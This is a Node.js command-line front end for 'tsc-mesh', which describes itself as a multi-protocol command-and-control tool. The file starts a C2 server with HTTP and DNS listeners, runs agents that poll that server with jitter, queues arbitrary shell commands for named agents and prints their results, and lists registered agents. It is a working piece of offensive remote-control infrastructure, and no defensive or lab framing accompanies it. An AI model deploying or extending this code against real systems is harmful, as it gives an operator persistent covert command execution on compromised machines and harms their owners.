#!/usr/bin/env node

const minimist = require('minimist');
const http = require('http');
const { C2Server } = require('../src/c2server');
const { C2Agent } = require('../src/c2agent');

const argv = minimist(process.argv.slice(2));
const cmd = argv._[0];

function showHelp() {
  console.log(`
tsc-mesh - Multi-Protocol C2 Mesh Tool

Usage:
  tsc-mesh server [--port <port>] [--dns-port <port>]
    Start C2 server (default port: 8443, DNS port: 5353)

  tsc-mesh agent --server <url> [--id <id>] [--interval <ms>]
    Start C2 agent connecting to server
    (default id: random, default interval: 5000ms, jitter: 2000ms)

  tsc-mesh send --server <url> --agent <id> --cmd "<command>"
    Send a command to an agent

  tsc-mesh status --server <url>
    Show all registered agents and their status

  tsc-mesh help
    Show this help message
`);
}

async function cmdServer() {
  const port = argv.port || 8443;
  const dnsPort = argv['dns-port'] || 5353;
  const server = new C2Server({ port, dnsPort });

  server.on('agent-connected', (id, channel) => {
    console.log(`[+] Agent connected: ${id} (via ${channel})`);
  });

  server.on('agent-disconnected', (id) => {
    console.log(`[-] Agent disconnected: ${id}`);
  });

  server.on('heartbeat', (id, channel) => {
    const status = server.getAgentStatus(id);
    const pending = status ? status.pendingCommands : 0;
    console.log(`[heartbeat] ${id} (${channel}) pending: ${pending}`);
  });

  server.on('command-sent', (id, cmd) => {
    console.log(`[>] Command queued for ${id}: ${cmd}`);
  });

  server.on('result', (id, result) => {
    console.log(`[<] Result from ${id}: exit=${result.exitCode}`);
    if (result.stdout) console.log(result.stdout);
    if (result.stderr) console.error(result.stderr);
  });

  try {
    await server.start();
    console.log(`[*] C2 Server listening on port ${port}`);
    console.log(`[*] DNS Server listening on port ${dnsPort}`);
    console.log('[*] Press Ctrl+C to stop');
  } catch (err) {
    console.error('Failed to start server:', err.message);
    process.exit(1);
  }

  process.on('SIGINT', () => {
    console.log('\n[*] Shutting down...');
    server.stop();
    process.exit(0);
  });
}

async function cmdAgent() {
  const serverUrl = argv.server;
  if (!serverUrl) {
    console.error('Error: --server is required');
    process.exit(1);
  }

  const agent = new C2Agent({
    server: serverUrl,
    id: argv.id,
    interval: argv.interval || 5000,
    dnsPort: argv['dns-port'] || 5353
  });

  agent.on('started', (id) => {
    console.log(`[*] Agent started: ${id}`);
    console.log(`[*] Connecting to server: ${serverUrl}`);
  });

  agent.on('connected', (id, channel) => {
    console.log(`[+] Connected via ${channel}`);
  });

  agent.on('command-result', (cmd, result) => {
    console.log(`[*] Executed: ${cmd} (exit: ${result.exitCode})`);
  });

  agent.start();

  process.on('SIGINT', () => {
    console.log('\n[*] Shutting down agent...');
    agent.stop();
    process.exit(0);
  });
}

function cmdSend() {
  const serverUrl = argv.server;
  const agentId = argv.agent;
  const command = argv.cmd;

  if (!serverUrl || !agentId || !command) {
    console.error('Error: --server, --agent, and --cmd are required');
    process.exit(1);
  }

  const parsedUrl = new URL(serverUrl);
  const postData = JSON.stringify({ agent: agentId, command });
  const options = {
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || 8443,
    path: '/command',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', (chunk) => { body += chunk; });
    res.on('end', () => {
      try {
        const data = JSON.parse(body);
        console.log(JSON.stringify(data, null, 2));
      } catch (e) {
        console.log(body);
      }
    });
  });

  req.on('error', (err) => {
    console.error('Error sending command:', err.message);
    process.exit(1);
  });

  req.write(postData);
  req.end();
}

function cmdStatus() {
  const serverUrl = argv.server;
  if (!serverUrl) {
    console.error('Error: --server is required');
    process.exit(1);
  }

  const parsedUrl = new URL(serverUrl);
  const options = {
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || 8443,
    path: '/agents',
    method: 'GET'
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', (chunk) => { body += chunk; });
    res.on('end', () => {
      try {
        const data = JSON.parse(body);
        if (data.agents && data.agents.length === 0) {
          console.log('No agents registered.');
        } else if (data.agents) {
          console.log('Registered agents:');
          for (const agent of data.agents) {
            const status = agent.connected ? 'CONNECTED' : 'DISCONNECTED';
            console.log(`  ${agent.id}`);
            console.log(`    Channels: ${agent.channels.join(', ') || 'none'}`);
            console.log(`    Status: ${status}`);
            console.log(`    Last seen: ${new Date(agent.lastSeen).toISOString()}`);
          }
        } else {
          console.log(JSON.stringify(data, null, 2));
        }
      } catch (e) {
        console.log(body);
      }
    });
  });

  req.on('error', (err) => {
    console.error('Error fetching status:', err.message);
    process.exit(1);
  });

  req.end();
}

const commands = {
  server: cmdServer,
  agent: cmdAgent,
  send: cmdSend,
  status: cmdStatus,
  help: showHelp
};

if (commands[cmd]) {
  commands[cmd]();
} else {
  showHelp();
}
